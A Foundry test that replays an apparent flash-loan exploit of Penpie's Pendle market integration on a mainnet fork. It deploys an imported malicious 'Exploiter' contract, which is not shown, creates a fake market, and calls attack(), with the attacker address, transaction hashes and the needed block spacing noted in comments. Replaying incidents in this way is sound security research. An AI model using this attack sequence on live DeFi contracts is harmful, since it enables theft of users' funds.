// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "forge-std/Test.sol";
import "contracts/Exploiter.sol";

contract Replay is Test {
    Exploiter exploiter;

    function setUp() public {
        vm.createSelectFork(vm.envString("ETHEREUM_RPC"), 20671878 - 1);
        vm.label(agETH, "agETH");
        vm.label(balancerVault, "balancerVault");
        vm.label(rswETH, "rswETH");
        vm.label(PENDLE_Market_AgETH, "PENDLE_Market_AgETH");
        vm.label(PENDLE_Market_rswETH, "PENDLE_Market_rswETH");
        vm.label(PendleRouterV4, "PendleRouterV4");
        vm.label(PendleYieldContractFactory, "PendleYieldContractFactory");
        vm.label(PendleMarketFactoryV3, "PendleMarketFactoryV3");
        vm.label(Penpie_MasterPenpie, "Penpie_MasterPenpie");
        vm.label(Penpie_PendleMarketRegisterHelper, "Penpie_PendleMarketRegisterHelper");
        vm.label(Penpie_PendleMarketDepositHelper_0x1c1f, "Penpie_PendleMarketDepositHelper_0x1c1f");
        vm.label(PenpieStaking_0x6e79, "PenpieStaking_0x6e79");
    }

    // EOA: 0x7A2f4D625Fb21F5e51562cE8Dc2E722e12A61d1B
    function test_Hack() public {
        // 创建Exploiter(恶意SY合约)
        exploiter = new Exploiter();
        // 调用exploiter 创建恶意Market tx: 0x7e7f9548f301d3dd863eac94e6190cb742ab6aa9d7730549ff743bf84cbd21d1 blockNum: 20671878
        exploiter.createMarket();

        // To pass `if lastRewardBlock != block.number` in PendleMarketV3 contract
        // 这里要求创建market和attack发生在两笔tx中
        vm.roll(block.number + 1);


        // Attack tx: 0x42b2ec27c732100dd9037c76da415e10329ea41598de453bb0c0c9ea7ce0d8e5 blockNum: 206771892
        exploiter.attack();

        // 因为黑客的交易中间间隔了几十个块，这里会有0.001个ETH左右的误差
        console.log('Flash loan agETH:', exploiter.agETH_flash_bal());
        console.log('Flash loan rswETH:', exploiter.rswETH_flash_bal());
        console.log('Final balance in agETH:     ', IERC20(agETH).balanceOf(address(exploiter)));
        console.log('Final balance in rswETH:     ', IERC20(rswETH).balanceOf(address(exploiter)));
    }
}